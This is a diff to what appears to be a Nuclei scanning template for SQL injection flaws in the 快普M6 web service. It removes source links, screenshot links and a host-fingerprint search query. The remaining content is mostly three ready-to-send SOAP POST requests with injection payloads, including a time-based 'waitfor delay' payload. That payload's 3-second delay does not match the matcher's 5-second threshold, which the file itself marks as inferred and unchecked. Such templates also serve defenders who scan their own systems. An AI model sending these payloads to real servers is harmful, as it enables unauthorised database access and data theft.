@@ -3,24 +3,18 @@ info:
   name: 快普M6 GetAccountTitleList 存在多个SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/turwb33ey7s191lx
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: turwb33ey7s191lx
-    fofa: body="Resource/JavaScript/jKPM6.DateTime.js"
 http:
 - raw:
-  - "POST /WebService/wsAutoComplete.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/soap+xml;charset=UTF-8;action=\"http://tempuri.org/GetAccountTitleList\"\n\n<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:tem=\"http://tempuri.org/\">\n   <soap:Header/>\n   <soap:Body>\n      <tem:GetAccountTitleList>\n         <!--Optional:-->\n         <tem:prefixText>'-1/user--</tem:prefixText>\n         <tem:count>1</tem:count>\n      </tem:GetAccountTitleList>\n   </soap:Body>\n</soap:Envelope>\n![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1783954376231-ba6acba4-1f5e-4be0-a29f-a37d65597716.png)\n\nPOC2如下"
+  - "POST /WebService/wsAutoComplete.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/soap+xml;charset=UTF-8;action=\"http://tempuri.org/GetAccountTitleList\"\n\n<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:tem=\"http://tempuri.org/\">\n   <soap:Header/>\n   <soap:Body>\n      <tem:GetAccountTitleList>\n         <!--Optional:-->\n         <tem:prefixText>'-1/user--</tem:prefixText>\n         <tem:count>1</tem:count>\n      </tem:GetAccountTitleList>\n   </soap:Body>\n</soap:Envelope>\n\nPOC2如下"
   redirects: false
   matchers:
   - status:
     - 200
     type: status
 - raw:
-  - "POST /WebService/wsAutoComplete.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/GetCustomerList\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetCustomerList xmlns=\"http://tempuri.org/\">\n      <prefixText>2';waitfor delay '0:0:3'--+</prefixText>\n      <count>1</count>\n      <contextKey>1</contextKey>\n    </GetCustomerList>\n  </soap:Body>\n</soap:Envelope>\n\n\nPOC3如下"
+  - "POST /WebService/wsAutoComplete.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/GetCustomerList\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetCustomerList xmlns=\"http://tempuri.org/\">\n      <prefixText>2';waitfor delay '0:0:3'--+</prefixText>\n      <count>1</count>\n      <contextKey>1</contextKey>\n    </GetCustomerList>\n  </soap:Body>\n</soap:Envelope>\n\nPOC3如下"
   redirects: false
   matchers:
   - type: dsl
@@ -28,7 +22,7 @@ http:
     - status_code == 200 && duration >= 5
     condition: and
 - raw:
-  - "POST /WebService/wsAutoComplete.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/GetSupplierList\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetSupplierList xmlns=\"http://tempuri.org/\">\n      <prefixText>1'</prefixText>\n      <count>1</count>\n      <contextKey>1</contextKey>\n    </GetSupplierList>\n  </soap:Body>\n</soap:Envelope>\n![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1783954376650-af526d86-5085-4cf3-aace-db087aab82f6.png)"
+  - "POST /WebService/wsAutoComplete.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/GetSupplierList\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetSupplierList xmlns=\"http://tempuri.org/\">\n      <prefixText>1'</prefixText>\n      <count>1</count>\n      <contextKey>1</contextKey>\n    </GetSupplierList>\n  </soap:Body>\n</soap:Envelope>"
   redirects: false
   matchers:
   - status:
